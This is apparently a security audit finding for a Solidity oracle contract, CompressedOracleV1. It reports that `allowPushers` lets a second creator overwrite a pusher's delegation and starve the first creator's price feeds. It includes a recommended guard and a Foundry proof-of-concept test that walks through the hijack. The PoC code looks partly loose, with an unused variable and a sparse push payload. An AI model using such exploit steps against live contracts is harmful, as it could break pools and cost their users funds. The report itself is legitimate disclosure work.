The core of the question is whether `allowPushers` enforces a single-namespace-per-pusher invariant. The code is unambiguous.

**The signature domain** at line 205 commits to `(block.chainid, address(this), deadline, pusher, msg.sender)`. Because `msg.sender` (the creator) is part of the signed message, sig_A and sig_B are cryptographically distinct — creator B cannot reuse sig_A. Creator B needs their own valid pusher signature.

**The overwrite** at line 209 is unconditional:

```solidity
namespaceRemapping[pusher] = msg.sender;
```

There is no guard of the form `require(namespaceRemapping[pusher] == address(0))`. If the pusher has signed for both creator A and creator B (two separate off-chain signatures), creator B can call `allowPushers` with sig_B and silently overwrite `namespaceRemapping[pusher]` from `creatorA` to `creatorB`. All subsequent fallback pushes from that pusher then land in creator B's namespace.

**The critical precondition** is that the pusher must have signed for creator B. The pusher is an off-chain entity — the contract places no on-chain restriction on how many creators a pusher may sign for. A shared pusher service, a pusher that was later approached by creator B, or a pusher tricked into signing a second consent message all satisfy this precondition without any privileged access.

**Impact path**: pusher's fallback pushes → `namespaceRemapping[msg.sender]` resolves to creatorB → writes land in creatorB's namespace → creatorA's slots receive no further updates → `timestampMs` ages past `maxTimeDrift` → `AnchoredPriceProvider` / pool price reads revert as stale → creatorA's pool swaps are permanently broken until creatorA re-delegates a different pusher.

This is broken core pool functionality, not a gas-only or view-only issue.

### Title
Unconditional overwrite in `allowPushers` lets a second creator hijack a delegated pusher and silently starve the first creator's feeds — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary
`CompressedOracleV1.allowPushers` writes `namespaceRemapping[pusher] = msg.sender` without checking whether the pusher is already delegated to a different creator. Because the EIP-191 signature domain includes the caller's address, a second creator who obtains a separate valid pusher signature can unconditionally overwrite the mapping, redirecting all future pushes away from the first creator's namespace.

### Finding Description
`allowPushers` verifies that the pusher signed `(chainid, oracle, deadline, pusher, msg.sender)` and then unconditionally sets `namespaceRemapping[pusher] = msg.sender`. [1](#0-0) 

Because `msg.sender` is part of the signed payload, each creator requires their own distinct pusher signature. There is no on-chain mechanism preventing a pusher from signing consent for multiple creators, and there is no guard preventing the second `allowPushers` call from overwriting an existing delegation. The fallback push path reads `namespaceRemapping[msg.sender]` at the top of every call and uses it as the write namespace with no further checks. [2](#0-1) 

### Impact Explanation
After the overwrite, every fallback push from the hijacked pusher writes into creator B's namespace. Creator A's slots receive no further timestamp updates. Once the last written timestamp ages past `maxTimeDrift`, every oracle read for creator A's feeds reverts as stale. Any pool whose `AnchoredPriceProvider` is bound to those feeds can no longer execute swaps — broken core pool functionality with no recovery path for creator A short of re-delegating a different pusher.

### Likelihood Explanation
The precondition is that the pusher has signed a consent message for creator B. This is realistic for:
- shared or commercial pusher services that sign for multiple clients,
- a pusher that was later approached by a malicious creator B,
- social-engineering / phishing of the pusher's signing key.

No privileged oracle-admin or factory-owner access is required. The entire attack executes through the public `allowPushers` entrypoint.

### Recommendation
Add a guard in `allowPushers` (and `allowContractPushers`) that rejects any attempt to overwrite an existing non-zero delegation:

```solidity
address existing = namespaceRemapping[pusher];
require(existing == address(0) || existing == msg.sender, AlreadyDelegated());
```

This enforces the single-namespace-per-pusher invariant on-chain. A pusher that wishes to switch creators must first call `revokePusher()` to clear the old mapping.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract PusherHijackTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY  = 0xAAAA;
    uint256 constant CREATOR_A_KEY = 0xBBBB;
    uint256 constant CREATOR_B_KEY = 0xCCCC;

    address pusher;
    address creatorA;
    address creatorB;

    function setUp() public {
        pusher   = vm.addr(PUSHER_KEY);
        creatorA = vm.addr(CREATOR_A_KEY);
        creatorB = vm.addr(CREATOR_B_KEY);
        oracle   = new CompressedOracleV1(address(this), 60_000);
    }

    function _signConsent(uint256 pk, uint256 deadline, address _pusher, address _creator)
        internal view returns (bytes memory)
    {
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, _pusher, _creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function testPusherHijack() public {
        uint256 deadlineA = block.timestamp + 1 days;
        uint256 deadlineB = block.timestamp + 2 days;

        // Step 1: pusher signs consent for creator A
        bytes memory sigA = _signConsent(PUSHER_KEY, deadlineA, pusher, creatorA);
        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sigA;
        vm.prank(creatorA);
        oracle.allowPushers(deadlineA, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA, "should be delegated to A");

        // Step 2: pusher also signs consent for creator B (separate off-chain signature)
        bytes memory sigB = _signConsent(PUSHER_KEY, deadlineB, pusher, creatorB);
        sigs[0] = sigB;
        vm.prank(creatorB);
        oracle.allowPushers(deadlineB, pushers, sigs);

        // Invariant violated: mapping now points to B, not A
        assertEq(oracle.namespaceRemapping(pusher), creatorB, "hijacked to B");

        // Step 3: pusher pushes — lands in B's namespace, A's feeds starve
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw  = uint48((uint48(1_000_000) << 16) | (uint48(4) << 8) | 2);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(
            abi.encodePacked(uint256(tsMs) << 8 | 5)  // slotId=5
        );
        assertTrue(ok);

        // Creator A's feedId receives no update
        bytes32 feedA = oracle.feedIdOf(creatorA, 5, 0);
        assertEq(oracle.getOracleData(feedA).timestampMs, 0, "creator A starved");
    }
}
```
